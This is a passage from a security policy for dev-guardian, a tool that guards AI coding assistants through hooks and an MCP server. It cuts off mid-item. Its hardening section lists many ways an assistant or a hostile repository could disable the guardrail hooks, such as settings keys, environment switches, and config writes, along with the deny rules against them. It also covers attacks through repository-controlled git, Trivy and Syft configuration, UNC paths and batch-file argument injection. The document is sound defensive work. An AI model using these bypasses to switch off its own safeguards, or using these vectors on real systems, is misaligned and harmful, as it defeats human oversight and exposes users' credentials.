# Security Policy

dev-guardian is a security tool, so we hold its own code to the bar it enforces.

## Supported versions

Only the latest release receives security fixes; older tags are not patched —
upgrade to the newest release.

| Version | Supported |
| ------- | --------- |
| 3.8.x   | ✅        |
| < 3.8   | ❌        |

## Reporting a vulnerability

**Do not open a public issue for security reports.**

Email **[carlospereira@prodigitalkey.com](mailto:carlospereira@prodigitalkey.com)** with:

- a description of the issue and its impact,
- steps to reproduce (PoC if possible),
- the affected version / commit.

You can expect an acknowledgement within **72 hours** and a remediation plan
once the report is triaged. Please allow a reasonable disclosure window before
going public; we will credit reporters who want it.

## Scope

In scope: the MCP server (`mcp/`), the CLI (`cli/dev-guardian.mjs`), the
guardrail hooks (`hooks/`), the skills and slash commands, the bundled configs
and CI templates (`configs/`), and the supply-chain logic in `scan_skill`,
`vet_packages`, `audit_agent_config` and `audit_mcp_tools`.

Out of scope: vulnerabilities in the third-party scanners dev-guardian
orchestrates (Semgrep, Trivy, gitleaks, Syft, WPScan, …) — report those to
their respective projects.

## Hardening posture

- **dev-guardian sends no telemetry of its own.** Results persist to
  `.guardian/guardian.db` in the scanned project and never leave it. Reports and
  the dashboard are self-contained and load no external assets.
- **A project's database is used only when it is yours.** A database is its
  writer's data: a trigger in a committed `.guardian/guardian.db` hid every
  finding, and so did suppressions with no project in one whose schema was
  exactly dev-guardian's, and scans dated in the future that outranked the
  user's own. A database dev-guardian creates carries a random id registered
  in a per-user registry, and is trusted only at the path it was registered
  for (the id travels with a copy). Nothing else is trusted automatically —
  not one from 3.0.0 or earlier, not a copy: nothing in a file tells its
  owner from whoever wrote it. You register one yourself with `dev-guardian
  db adopt` (CLI only, never an MCP tool — an assistant must not run it for
  you): it shows what the database holds, flagging suppressions that apply to
  every project and scans dated in the future, and registers it with `--yes`.
  Refused even then: a database git tracks (in any case), a submodule, a link
  or junction, a schema holding what the migrations never create (a trigger,
  a view, an unknown table or index, a constraint added to a known table), or
  any scan dated in the future. A foreign database is not opened for writing
  and not modified: the per-user fallback (`%LOCALAPPDATA%\dev-guardian`,
  `~/.local/share/dev-guardian`, or `GUARDIAN_DATA_DIR`) is used instead, and
  `health_status` says why and what to do. No path stored in a database is
  looked up to judge it (a `\\host\share` would reach the network). A file
  SQLite cannot read, or a per-user directory that cannot be used, never
  stops the server: it runs on the fallback or an in-memory database and
  says history will not persist. History readers ignore scans dated in the
  future, and say how many. `health_status` and `risk_score` also say how
  many findings suppressions take out. Every connection runs with
  `trusted_schema = OFF` and `cell_size_check = ON`.
- **Secrets stay redacted.** gitleaks runs with `--redact`; a credential
  finding's snippet is cleared before it is stored, and cleared again before an
  exported report, a GitHub issue or the dashboard shows it. `suggest_fix`
  never reads a credential finding's file back, and in the source it quotes
  around any other finding it withholds every line a credential finding of
  the project points at and every line the hooks' secret detector finds one
  on (`redacted_lines`), as the LLM scan's briefs do. The one exception is opt-in:
  `verify_live` (below) reads the value from a private temporary report, sends
  it only to its own provider, and deletes the report. The CLI gate also reads
  values back, to tell a secret that moved from a new one, but only in memory:
  each is HMAC'd under a key the process draws once, and neither the value nor
  its HMAC is stored or printed (`mcp/src/ci/secretValues.ts`).
- **A project cannot switch the protective hooks off.** In a project's
  `.guardian/hooks.config.json`, `enabled: false`, `bash.block: false` and
  `bash.warn: false` are ignored (SessionStart tells the model so), and there is
  no project-level switch for install vetting; only advisory settings
  (`secrets.warn`, `sessionStart`, `ignorePaths`) and stricter ones take
  effect. Switching a protective hook off takes the user-level
  `~/.config/dev-guardian/hooks.json` or the environment (`GUARDIAN_HOOKS=off`,
  `GUARDIAN_HOOKS_BASH_BLOCK=0`, `GUARDIAN_PKG_VET=0`). The write guard denies
  an assistant's `Write` / `Edit` / `MultiEdit` (or a third-party MCP server's
  write tool) of any hook configuration file,
  and the shell guard denies what it can see a command do to one: write it
  (`>`, `tee`, `sed -i`, `perl -pi`, `rsync`, `cp` / `mv` onto it, PowerShell
  `Set-Content` / `[IO.File]::WriteAllText`, cmd `>` inside `cmd /c "…"`, …),
  remove or move it away, copy a directory onto `.guardian` or
  `~/.config/dev-guardian`, or name it in program text on the command line
  (`node -e`, `python -c`, a heredoc fed to `python`), relative paths resolved
  after a `cd`. A program run from a file is not seen, which matters only for
  the user-level file ([docs/hooks.md](docs/hooks.md) lists what else is not).
  A project's `ignorePaths` and `.guardian/hooks-allowlist.json` narrow the
  secret warning only, never a secret block the user enabled. Each hook
  configuration file is first checked, component by component with `lstat` +
  `readlink`, for a link to a network or device path (`\\host\share`), which
  is refused unopened; it is then opened (non-blocking where the OS allows) and
  judged by `fstat` on what was opened: only a regular file of at most 64 KiB
  is read, so a FIFO, a link to `/dev/zero`, a Windows link to a named pipe or
  to an unreachable share in its place no longer hangs the hook into its 15 s
  timeout — which used to let the tool call run unguarded — and the shell
  guard denies creating one there. The install hook reads its registry
  configuration (`.npmrc`, `pip.conf`, `nuget.config`, …) through the same
  link walk; one that is there but could not be read counts as possibly a
  private registry, so a missing name warns. **Claude Code's own settings**: an assistant's `Write` / `Edit` /
  `MultiEdit` (or MCP write) of `.claude/settings.json` or `settings.local.json`,
  or of the machine's `managed-settings.json`, is denied
  when it would newly set `disableAllHooks` (any value that may read as true),
  an `env` entry setting `GUARDIAN_HOOKS=off`, `GUARDIAN_HOOKS_BASH_BLOCK=0`,
  `GUARDIAN_PKG_VET=0`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, or `NODE_OPTIONS` /
  `GUARDIAN_PKG_VET_DEADLINE_MS` / `GUARDIAN_OFFLINE` to any
  value, or an `enabledPlugins` entry turning dev-guardian off — read as JSONC,
  escapes decoded and a repeated key counted every time; a new `env` `PATH`,
  `HOME`, `USERPROFILE`, other `NODE_*` / `GUARDIAN_*` variable or proxy, an
  edit that cannot be applied as plain text, a reading past 4 s, and an MCP
  tool's change whose result cannot be worked out (a regex replace, a move onto
  the file) are asked about; every other edit of those files is allowed. A
  shell write of them is denied when the command names one of those keys — a
  write through a symbolic link or junction included, and making such a link
  to them is denied — and so is `claude plugin disable|uninstall` of dev-guardian.
  See [docs/hooks.md](docs/hooks.md).
- **`audit_mcp_tools` executes third-party code.** It starts the MCP servers
  named in its `servers` argument — their `command` and `args`, as the host
  would launch them — **only for the server names the caller lists
  explicitly**: there is no wildcard and no default, and a name no config
  declares is skipped. A name selects entries exactly: `<source>::<name>`
  picks one; a bare name whose entries launch different servers is refused
  with the qualified names to choose from; another project's entries in
  Claude Code's global config are never started. Each runs with a **minimal
  environment** (the MCP SDK's default allowlist — `PATH`, `HOME` /
  `USERPROFILE` and a few more, plus the variables Windows adds to every
  process — **plus the entry's own `env`**), never this server's full
  environment, and a `${VAR}` placeholder is passed literally rather than
  filled from it; its working directory is the project. The audit sends
  `initialize` and the list methods only and **never calls `tools/call`**;
  it **contacts a remote server only with `allow_remote: true`** — an entry
  is remote when it has a URL; when a UNC or device path appears anywhere in
  its command, an argument or an `env` value (touching it would send the
  user's credentials to that host over SMB); when a URL with a host appears
  there (`mcp-remote` and other proxies, `file://host/…`, `NODE_OPTIONS`,
  `DOCKER_HOST`, a database URL — every `scheme://`, and `http`, `https`,
  `ws`, `wss` or `ftp` followed by `:` with or without `//`, parsed as
  WHATWG does; one that does not parse is remote); when any word of its
  command line, a `-c` / `/c` string included, is `ssh`, `sshpass`, `plink`,
  `kubectl` or `oc`; or when it runs `docker`, `podman` or `nerdctl`
  against another engine (`-H`, `--host`, a context, `--remote`,
  `--connection`, `--url`, `DOCKER_CONTEXT`, `CONTAINER_CONNECTION`). A URL
  whose parsed host is exactly `localhost`, a `127.x.x.x` address or `[::1]`
  is local (`DATABASE_URL=postgres://user:pw@localhost/app` needs no
  `allow_remote`) — unless it carries a backslash anywhere, more than one
  `@`, a host after its `@` that is not written as loopback, or a query on
  a non-HTTP scheme (libpq reads a host from `?host=`), or a space, quote
  or control character inside its host, since another parser may then read
  another host (TAB and newline are deleted first, as URL parsers delete
  them); a `url` entry
  needs `allow_remote` even at localhost. **Loopback is where a tunnel
  starts**: `ssh -L`, `kubectl port-forward`, a local proxy or a VPN client
  listening on 127.0.0.1 make a loopback URL reach another machine, and the
  configuration does not say so. **This is a textual gate on the shapes a
  configuration can take, not a sandbox**: a program that looks local still
  reaches the network by itself once started (`npx` downloads the package; a
  server calls its own API), and nothing here sees that. It **kills the server's
  process tree afterwards** (the process group on POSIX, `taskkill /T` on
  Windows), whether the server answered or not. On Windows the command is
  resolved with asynchronous look-ups over the local `PATH` entries only, so
  a network path never blocks the server — though a `PATH` entry that looks
  local but is not (a mapped drive, a junction to a share) is still looked
  up, off the event loop. Each server has a time budget, an
  inbound budget (4 MiB, 10 000 messages, 2 MiB per message — 40 times the
  largest real listing measured) and a 1000-item cap per list; its listing
  is analysed right after it answers, up to 2 MiB of text, 64 KiB per
  string and 50 000 strings, with a turn of the event loop between items
  and every 256 KiB of text or 16 ms inside one,
  then dropped. The whole audit has a budget (`GUARDIAN_MCP_AUDIT_BUDGET_MS`);
  cancelling the call, or the budget running out, stops launching and stops
  the analysis. Whatever a bound leaves unread makes that server partial.
  What a started server does while it runs — its own network requests
  included — is that server's code: run the audit only for servers you would
  let the host start.
- **A clean `audit_mcp_tools` result covers only what the server chose to
  show this client.** The audit names itself honestly (`dev-guardian-audit`,
  no client capabilities, a minimal environment), so a server can recognise
  it and serve it definitions other than those it serves the host. Pins help
  (a definition that changes later, or a tool that vanishes and returns
  changed, is reported), but no audit from outside the host can prove what
  the host is shown.
- **Agent configs are read the way the hooks read theirs.** `audit_agent_config`
  and `audit_mcp_tools` read every MCP host config — the user-level ones
  included, and Claude Code's from `CLAUDE_CONFIG_DIR` when that is set —
  through the hooks' hardened reader: links below the project (or the home
  directory) are walked first and a link to a network or device path is
  refused unopened, then the file is opened non-blocking and only a regular
  file within its cap (256 KiB; 16 MiB for Claude Code's `.claude.json`) is
  read. A FIFO, a device, a directory or a network link in a config's place
  can no longer hang either tool; a config that is there and was not read is
  named in `sources_unreadable`, is a failed pass in `tools_run`, and lowers
  coverage — never read as "no servers declared".
- **A scanned repository does not configure Trivy.** Trivy reads `trivy.yaml`
  from its working directory, and every Trivy pass used to run in the
  project: a committed `trivy.yaml` of `severity: [UNKNOWN]` turned a project
  with 7 known-vulnerable findings into a clean, fully covered scan (and the
  CI gate's exit 1 into 0), and its `db.repository` or `server.addr` could
  have sent the package list to a host of the repository's choosing. Every
  Trivy pass now runs in a report directory the scan created, with `--config`
  pointing at an empty file dev-guardian writes, and the target passed
  explicitly (`mcp/src/runners/trivyRun.ts`). The project's `.trivyignore` is
  still honoured — accepted risks are the project's to state — but only
  explicitly (`--ignorefile`), and the run names it (`honoured_config`, and
  its `tools_run` reason); `review_pr` warns when the diff edits it. What it
  suppressed is counted and named in the scan's warnings and the CI gate's
  output, JSON and SARIF (Trivy 0.50.0 or newer; `trivy config` cannot list
  it and says so). Nor does it configure `npm audit`: `deps_audit` runs it on
  a copy of `package.json` and its lock files, so the project's `.npmrc` is
  never read (see "A repository never chooses where … your credentials" below).
- **Nor Syft, nor a `.bandit` below the root; the rest is named.** Syft read
  the project's `.syft.yaml` (`generate_sbom` ran in the project): a
  committed `select-catalogers: ['-javascript']` emptied the SBOM of a
  project pinning lodash, and the same file can turn on Syft's network
  lookups. Syft now runs like Trivy (`mcp/src/runners/syftRun.ts`: a report
  directory, `-c` pointing at an empty file, no update check). `bandit -r`
  applied a `.bandit` found anywhere in the tree — a dependency's included —
  to every file; it now gets `--ini`: the project's own root `.bandit`, or an
  empty one. The configs a project legitimately owns and a scanner reads are
  honoured and named on the run that read them, one way for every runner
  (`honoured_config` and its reason, "honoured the project's X (what it
  decides)"; the table is `mcp/src/runners/repoConfig.ts`, and a test fails
  on a scanner spawned without an entry): `.trivyignore`, a root `.bandit`,
  `.gitleaks.toml` and `.gitleaksignore`, `.hadolint.yaml` (hadolint now runs
  in the report directory and is given it with `--config`),
  `.github/actionlint.yaml`, `zizmor.yml` / `.github/zizmor.yml`, every
  `.semgrepignore` (root and nested, on a whole-project Semgrep run —
  Semgrep ignores them for files named explicitly), a `requirements*.txt`
  (or a file it includes with `-r` / `-c`) whose index options decide where
  pip-audit's resolution installs
  from, or whose direct, VCS or network references decide where it fetches
  from (read by the same parser as `create_fix_pr`'s allowlist; whatever it
  could not check — a URL include, an environment variable, a path or link
  out of the project — is named as such: pip may take its sources from it),
  a file at one of these paths that is a link, a FIFO or a directory
  ("present, not checked"), `NuGet.config`, the .NET build's `.editorconfig`,
  `.globalconfig` and `Directory.Build.props` / `.targets`, quality_check's
  ruff, jscpd, radon, staticcheck and ESLint configurations, shellcheck's root
  `.shellcheckrc`, detekt's `config/detekt/detekt.yml` or `detekt.yml`, and
  cppcheck's `compile_commands.json` or `build/compile_commands.json`. `.guardianignore`
  is named on every run of a scan it shapes.
- **A pull request does not choose its own gate.** On a pull request, the
  checkout's `.guardian/baseline.json`, Semgrep rules and ignore files are the
  pull request's: read from there, a fork adopted its own finding into the
  baseline, or deleted the rule that caught it, and passed. `scan
  --baseline-ref <ref>` reads the baseline from a commit with git, and
  `--rules-ref <ref>` copies the project's Semgrep rules, `.guardianignore`,
  `.trivyignore` and `.bandit` from it (`mcp/src/ci/refConfig.ts`); the
  `ci-init` pipelines pass the pull request's base. `.semgrepignore` and
  gitleaks' two files, which no scanner flag can read from a ref, are put back
  to the base's in the disposable CI checkout (`--reset-exclusions-from`,
  refused anywhere else); actionlint's and zizmor's configuration and the .NET
  build's files are named in the report whenever the pull request changes
  them. Under a ref the gate never builds the pull request's tree: a .NET
  restore and build would run its MSBuild (`<Exec>` tasks, its packages'
  analyzers and source generators) inside the gate job, where it could replace
  a scanner or rewrite a report before the gate reads it — so the .NET
  analyzers are a named gap and the gate exits 2, unless the command line
  passes `--build-pr` for a pull request you trust (argv only: a
  `.guardian/ci.json` declaring it is refused). The pipeline file itself runs from the
  pull request's branch on every host: it needs a required review
  ([docs/ci.md](docs/ci.md#a-pull-request-cannot-gate-itself)).
- **The secrets history pass reads what `git log -p` leaves out** (3.7.0).
  gitleaks reads history as `git log -p`, and on a push no other pass stands
  behind it: a key in a file git reads as binary by its content (a NUL byte)
  and a key only a merge commit adds (an "evil merge" — git prints no merge's
  diff) were read by nothing, exit 0 (measured, gitleaks 8.30.1). Every file
  is now diffed as text, through an attributes file handed to git in the
  environment (`mcp/src/runners/historyView.ts`), and each two-parent merge's
  own change is read by a second run, `git log --merges
  --diff-merges=remerge`, whose temporary objects git writes to a scratch
  directory, never the repository. Named limits, said on the run: an
  octopus merge's own change; with a git older than 2.36 every merge's, and
  with one older than 2.40 what the working tree's `.gitattributes` hide; a file git
  reads as binary at a path that holds a file over 1 MiB in some commit (a
  text read of large binaries holds them whole: 110 MB took gitleaks to 1 GB);
  the repository's own `$GIT_DIR/info/attributes`, which outranks the
  attributes file (none in a fresh clone). The merges' run has a scanner's
  timeout — git's own history (21,575 merges) took 11 minutes to re-merge —
  and one that does not finish is a gap ([docs/ci.md](docs/ci.md#what-the-secrets-history-pass-reads)).
- **What `install_toolchain` installs is pinned, and checked before it
  runs.** Syft, Trivy and gitleaks came from routes that follow upstream —
  Syft's `install.sh` piped from its `main` branch, Trivy from its apt
  repository or `releases/latest`, gitleaks from `releases/latest` (in
  `scripts/install/install-linux.sh`, which runs for the Linux defaults and
  the Windows WSL fallback), scoop and choco on Windows — the route the
  credential-stealing Trivy v0.69.4 took on 2026-03-19. Every install of
  them now fetches one release (Syft 1.55.0, Trivy 0.76.1, gitleaks 8.30.1)
  and checks the archive against a sha256 dev-guardian pins
  (`PINNED_RELEASES` in `mcp/src/runners/installCatalog.ts`, each checked
  against the release's checksums file, GitHub's asset digest and an
  independent download) before unpacking it: `sha256sum` / `shasum` into
  `~/.local/bin` on Linux and macOS, `Get-FileHash` in PowerShell into
  `%USERPROFILE%\.local\bin` on Windows. The user's PATH is not changed (the
  Windows installer warns when it lacks the directory); the server appends
  that directory to its own PATH, after every other entry, so its scans find
  the tool without shadowing one installed elsewhere, and `install_toolchain`
  names where each binary went. A CPU with no pinned archive is refused. On
  Windows, winget, scoop and choco are a fallback that asks for that same
  version. On macOS, Trivy is the pinned archive first — the per-tool
  install used to take the vendor's Homebrew tap (`aquasecurity/trivy`),
  which installs Aqua's own release binaries rather than a Homebrew bottle
  and was found at 0.69.3 — with homebrew-core's `trivy` formula as the
  fallback, and `install-macos.sh` takes the same archive; Syft and gitleaks
  come from Homebrew first (homebrew-core bottles, built by Homebrew, not
  pinned to a version) with the pinned archive as the fallback. cosign's
  installer was already pinned this way. A test holds the Linux script and
  the macOS script's Trivy to the catalogue's versions and sums.
- **The pipelines `ci-init` writes install nothing by name alone** (3.7.0 and
  later). Their binaries were already pinned by sha256; bandit, Semgrep and
  zizmor came from `pipx install semgrep==<version>`, which pinned those three
  packages and nothing they depend on, and pipx first upgraded its own pip
  from PyPI. They now come, with every dependency, from a lock per Python
  (`configs/ci/python/<X.Y>/requirements.txt`, compiled with uv, every sha256
  PyPI lists for each pinned release, each matched against PyPI's JSON API)
  read from the dev-guardian clone the job verifies against the release
  commit, installed into a venv of the image's own Python with `pip install
  --require-hashes --only-binary :all:` — a file the lock does not hash is
  refused, and no package's build code runs ([docs/ci.md](docs/ci.md#ci-init)).
  `test/unit/configs/pinnedCiData.test.ts` holds each lock's top-level
  versions to `configs/ci/pinned.json`; `npm run pins` reports a lock that
  is stale, a locked release PyPI yanked, and the dependencies with newer
  releases.
- **Least privilege.** The MCP server reads and writes within the target project
  and its `.guardian/` directory, plus the temporary directories, the per-user
  data directory and cache listed in
  [mcp/README.md](mcp/README.md#what-the-server-writes). Outside them it writes
  only when asked: `install_toolchain` installs to `~/.local/bin` and
  `~/.local/lib/dev-guardian/` (or through the system's package manager), and
  `mcp-config --write --global` writes the host configs it names. It reads
  user-level host configs (`~/.claude.json` and the others in
  [docs/hosts.md](docs/hosts.md)) only for `audit_agent_config` and
  `audit_mcp_tools` with `include_user_config`.
- **The scanned repository's files are hostile input.** A clone, an archive or
  a pull request chooses what is at every path in it — a link, a junction, a
  FIFO, a device, a file of any size — and the server acts on it at startup,
  before any tool call (it keeps `.guardian/` out of `.gitignore`). Every read
  of a project file goes through `mcp/src/platform/projectFs.ts`: a path that
  resolves outside the project (a link, `..`), a link to a network or device
  path, anything but a regular file (judged by `fstat` on a descriptor opened
  non-blocking, so a FIFO is never waited on), and a file over the caller's cap
  are refused with a typed reason, and at most cap + 1 bytes are ever read.
  Every write into the project `lstat`s the target and refuses a link (a
  junction or a dangling link included) or a non-regular file, refuses a
  directory on the way that resolves outside the project, and writes a temp
  file beside the target that is then published with `link()` (create) or
  `rename()` (replace) — never written through a link, never into an inode a
  hard link shares. The tree hash hashes a link by its target text without
  following it; a report directory (`.guardian/reports/…`) with a link on its
  way is replaced by a fresh temp directory; `precommit_install` refuses a
  `.git`, hooks directory or hook file that would send pre-commit's writes
  elsewhere. A source-scan test lists every raw `fs` call left in `mcp/src`
  with the reason it is not the repository's. The last repository reads it
  named as not yet converted — in `runners/` (the scanner configs, the
  manifests and lock files read for Trivy's gaps, the stack detector's
  manifests, the project's Semgrep rule files) and `skillaudit/` — go through
  it too now: a `package.json` linked to `/dev/zero` had OOM-killed the server
  through `detect_stack`. Where a refused file would have changed what a tool
  reports, the result names it (`detect_stack`'s `unread_files`, a warning, a
  coverage gap). Bytes read are not memory used, so the parsers are bounded
  too: lines are iterated, never split into an array; a lock file is parsed
  only below a cap far under the read cap (above it Trivy's coverage gap is
  kept, "not checked") and a JSON document is refused by its value count
  before it is parsed. A YAML document passes four gates first
  (`mcp/src/platform/boundedParse.ts`): its size (1 MiB for a configuration —
  twelve times the largest rule pack shipped here — 5 MiB for an API spec), a
  count of every character that can open, separate or decorate a node (so
  nesting written on one line, `- - - … x`, counts), its nesting depth on the
  parser's own syntax tree (64), and the size of its value once aliases are
  followed (a "billion laughs", or an alias inside what it names, is refused);
  a fuzz of adversarial shapes sized to those gates holds every admitted parse
  under a second in `node:22 --memory 768m`; every walk that reads many files (`detect_stack`,
  the manifest walk, the IaC walk, the WordPress inventory) shares one byte
  and file budget, and a file past it is named. Nothing on a repository path
  is `stat`'ed, `realpath`'ed or tested with `existsSync` before the links on
  its way are walked with `lstat` — on Windows `existsSync` of a link to
  `\\host\share` blocked for 157 s and authenticated to the host. A scanner,
  a package manager and git itself (the hook's too) are spawned by the
  absolute path the name resolves to on
  PATH, looked up in-process: never a binary the repository planted in the
  directory it runs in (`where`, libuv and `cmd.exe` all searched it first,
  measured), and the server and the CLI set
  `NoDefaultCurrentDirectoryInExePath` and drop relative PATH entries for
  every other spawn. Both changes are to the process's own environment, so
  every child — a scanner, a package manager, the project's own test command —
  inherits them: `NoDefaultCurrentDirectoryInExePath=1`, and a PATH with no
  empty or relative entry (a script that relied on `.` in PATH no longer
  finds what it ran from there). **Not converted**: the `.guardian/guardian.db`
  the storage layer opens.
- **A batch file is never handed text `cmd.exe` could run.** On Windows a
  `.cmd` / `.bat` (WP-CLI's `wp.bat`, a gem's `wpscan.bat`, npm's
  `lighthouse.cmd`, `npm.cmd`) runs through `cmd.exe`, which reads its command
  line twice; a `"` before an `&` in a plugin slug or a URL ran a second
  command. dev-guardian refuses to start one with an argument holding `"`,
  `%`, a carriage return, a line feed or NUL (the tool reports it as a
  scanner that did not run), the tools take a slug, a token or a URL only in
  their own shape (a URL re-serialised, http or https), and a pull request's
  or an issue's body goes to `gh` in a file. A URL with a `%` (an encoded
  character) therefore cannot reach a `.cmd` Lighthouse or a `.bat` WPScan on
  Windows; run that check where the tool is not a batch file (WSL, Linux, macOS).
- **A scanned repository's own git configuration runs nothing.** A repository
  delivered with its own `.git/` (an archive, a ZIP download, a shared folder)
  names programs git runs: `core.fsmonitor` on `status` and `ls-files`; hooks in
  `.git/hooks` on an index write, a checkout and a commit (`--no-verify` still
  runs `prepare-commit-msg`, `post-commit` and `reference-transaction`); a
  filter driver's `clean`, `smudge` or `process` on `status`, `diff HEAD` and a
  checkout; a textconv driver, and `gpg.program` under `log.showSignature`, on
  the `git log -p` gitleaks runs; `core.sshCommand`, `core.askPass`, a
  credential helper or `remote.<name>.receivepack` on a push. Measured before
  this was fixed: `scan_sast` ran a repository's `core.fsmonitor` through
  Semgrep's own `git ls-files`, `scan_secrets` ran its textconv driver through
  gitleaks, and the SessionStart hook ran `core.fsmonitor`, the clean filter
  and `post-index-change` when a session merely opened the project. Every git
  dev-guardian starts — itself, and inside every scanner, package manager or
  script it runs — now takes configuration overrides from its environment
  (`GIT_CONFIG_COUNT`, appended after your own entries, which are kept), which
  outrank every file the repository has (`mcp/src/platform/gitSafety.ts`):
  - always: `core.fsmonitor=false`; `core.hooksPath` at a path that cannot
    exist (beneath the Node executable on Windows, beneath `/dev/null`
    elsewhere); `protocol.ext.allow=never`; `log.showSignature=false`;
    `gc.auto=0` and `maintenance.auto=false`; `diff.submodule=short` (a
    repository's `diff.submodule=diff` made gitleaks' `git log -p` diff inside
    a submodule, running its textconv driver — measured); and `GIT_PAGER=cat`,
    `GIT_EDITOR=:`, `GIT_SEQUENCE_EDITOR=:`;
  - for the repository at hand, read first with `git config --get-regexp`
    (which runs nothing) from its `local` and `worktree` scopes — every file
    they pull in with `include.path` or `includeIf` included: each filter
    driver's commands emptied and its `required` set false, each textconv
    driver `cat`, external diff and merge drivers emptied, `core.sshCommand`
    `ssh` (or your `GIT_SSH`), the gpg programs git's defaults,
    `core.askPass`, aliases and `core.alternateRefsCommand` emptied, and the
    credential-helper list reset to your own. Where your system or global
    configuration sets the same key, your value is used instead. A repository
    `core.gitProxy` (first match wins) is answered with an empty
    `GIT_PROXY_COMMAND` unless you set one; a repository
    `remote.<name>.uploadpack` (first value wins) with `GIT_NO_LAZY_FETCH=1`;
  - what decides where, and how, a git sends your credentials over HTTP — each
    measured to apply from a repository's own configuration, each measured
    overridden against local servers: `http[.<url>].extraHeader` (a header on
    every request) is reset under the repository's own key and your own
    headers for that URL replayed — never a header you set for another URL;
    `http[.<url>].proxy` and `remote.<name>.proxy` become your own proxy
    variable (`https_proxy`, `http_proxy`, `all_proxy`) or none;
    `http[.<url>].sslVerify` becomes `true`, and `.sslCAInfo` / `.sslCAPath`
    empty — the handshake then fails rather than trust a certificate authority
    of the repository's choosing; `.cookieFile` empty and `.saveCookies`
    false (a plain git WROTE its cookie jar to the path the repository chose);
    `.followRedirects` `initial`. A URL-specific key is overridden under its
    own key: git keeps the most specific match per URL, and a generic override
    appended after it loses (measured). `url.<base>.insteadOf` and
    `pushInsteadOf` cannot be overridden: `create_fix_pr` refuses to push, and
    names the key, when one from the repository's own configuration rewrites
    origin's push URL (yours still apply);
  - every initialised submodule, the same way — git goes into each one on a
    `status` or a `diff` of the work tree, where the submodule's OWN
    configuration (`.git/modules/<name>/config`, or an old-style in-tree
    `sub/.git/`) names its own drivers. Measured: a superproject
    `git status --porcelain` ran clean filters defined only in an absorbed
    submodule, in a submodule of that submodule, and in an in-tree one. Each
    gitlink in the index whose directory holds a `.git` is read, nested ones
    too, and its keys added to the overrides (named `… (submodule <path>)`).
    Where a query needs nothing inside a submodule's work tree —
    SessionStart's count, the working-tree file listings, `create_fix_pr`'s
    tree state, the CI gate's configuration diff — it also passes
    `--ignore-submodules=dirty`, which keeps git out of the submodule and
    still reports a submodule whose commit moved (measured). The auto_fix
    guard and CI's clean-checkout check keep full recursion — uncommitted work
    inside a submodule is still work — safe through the first layer;
  - dev-guardian's own commit passes `--no-verify`, and its push
    `--no-verify --receive-pack=git-receive-pack`. To a repository on this
    machine the receive-pack is `git -c … receive-pack` carrying that
    destination's own overrides: git removes `GIT_CONFIG_COUNT` from a local
    receive-pack's environment (measured — the destination's hooks ran). A
    checkout (`review_pr`'s head, `create_fix_pr`'s worktrees) is
    `worktree add --no-checkout`, then `reset --hard --no-recurse-submodules`
    inside the new worktree, so an `includeIf` that matches the new worktree
    is read — and neutralised — where the checkout runs, and a
    `submodule.recurse=true` (yours or the repository's) does not send the
    reset into submodules the worktree was never given. Semgrep's Docker
    fallback gets the overrides with `-e`.
  - A repository whose configuration cannot be read safely — a key or a
    submodule path that is not UTF-8, more than 200 command keys, more than 64
    initialised submodules or more than 8 levels of them, a read that takes
    over 10 s — is not run, and the tool says why. So is every repository
    when the git on `PATH` does not read `GIT_CONFIG_COUNT` (older than 2.31).
    What a run did not apply is named: `review_pr`'s warnings, the gitleaks
    history pass's reason, `create_fix_pr`'s `git_config_not_applied`.
  - **Limits.** Not hardened: the test command `create_fix_pr` runs, the
    application the DAST gate starts, and the project's own ESLint
    (`node_modules/eslint/bin/eslint.js` with its `eslint.config.js`), which
    `quality_check` — and `audit_executive` through it — runs when the project
    configures and installs one — all the project's own code, run by design
    (ESLint and the test command with the allowlisted environment described
    below); `precommit_install` keeps every override but the hooks redirect
    (installing hooks where git says they go is its job; pre-commit's own git
    calls are `rev-parse` and `config`). A filter or textconv driver defined
    in YOUR configuration (git-lfs) still runs when the repository maps a
    file to it: your program, the repository's input. Conditional includes
    are evaluated in the directory a process starts in: a scanner that enters
    another repository by itself (none of dev-guardian's do) carries the
    static layer and the first repository's overrides, not the other's. The
    configuration is read, then used, by separate processes, and one reading
    serves every git started in the same directory and environment for up to
    2 s: a local user who can rewrite `.git/config` in between is not
    stopped. Lazy fetching is
    refused only by a git that knows `GIT_NO_LAZY_FETCH` (measured: 2.52.0 and
    2.39.5 do). `remote.<name>.vcs` names a remote helper, which must already
    be installed. Git 2.52 has no configuration-defined hooks
    (`hook.<name>.command`); a later git that adds them is not covered by
    `core.hooksPath`. Keys read only by commands dev-guardian never runs —
    `difftool`, `mergetool`, `sendemail`, `submodule.<name>.update`,
    `trailer.<key>.cmd`, `web.browser` — are not overridden. A repository's
    `core.worktree` can still point git's file listing at another directory:
    a read, not an execution. On Windows the textconv identity `cat` is Git
    for Windows' own; where git cannot find it, git fails, loudly.
    Submodules: one that is not initialised (no `.git` in its directory) is
    not read — git does not go into it either; nor is an untracked nested
    repository, which a `status` lists as `?? dir/` without entering
    (measured). Over HTTP, not overridden: `http.sslCert` / `sslKey`,
    `sslVersion` / `sslCipherList`, the proxy's own TLS and authentication
    settings; the neutral proxy for a key that names no URL is the first of
    your `https_proxy`, `HTTPS_PROXY`, `http_proxy`, `all_proxy`,
    `ALL_PROXY`, which can differ from git's per-scheme choice; a repository
    that legitimately sets its own `sslCAInfo` cannot reach its server under
    dev-guardian (set it in your own configuration). A repository's own
    `url.<base>.insteadOf` is refused only for `create_fix_pr`'s push; any
    other network git in the project — a package manager resolving a git
    dependency in `create_fix_pr`'s worktree, `gh` — still follows it.
- **Repository text is escaped before it is shown.** A rule message, a
  snippet, a file name, a reason or a title can carry characters that render
  as nothing or reorder what does (a right-to-left override, a zero-width
  space, ESC). Every string in every tool result and resource — keys included
  — is passed through `untrustedText` (`mcp/src/platform/untrustedText.ts`) at
  the MCP response boundary, and to every progress notification's message:
  C0 and C1 controls (except `\n` and `\t` outside a path, name or id; a
  Windows `\r\n` in a multi-line field is read as `\n`, a lone `\r` is
  escaped), bidi controls and every other default-ignorable code point are
  written as a visible `\u{XXXX}`. The emoji sequences, keycaps,
  CJK variation selectors and subdivision flags `audit_mcp_tools` already
  exempts pass unchanged, and so does every other character: a `日本.py` stays
  `日本.py`. Stored findings are unchanged; only what is shown is escaped. The
  CLI's human output (`scan`, `baseline update`, `check`) is escaped the same
  way, and `status` still strips terminal escape sequences.
- **`create_fix_pr` runs the project's code.** To judge a candidate fix it runs
  the project's own test command — `npm test` (`scripts.test`), `pytest` (every
  `conftest.py`), `cargo test` (`build.rs`), `go test` — in its worktrees,
  **on a dry run too**, and its description says so. That command runs with an
  allowlisted environment (`extendEnv: false`): `PATH`, the home and temp
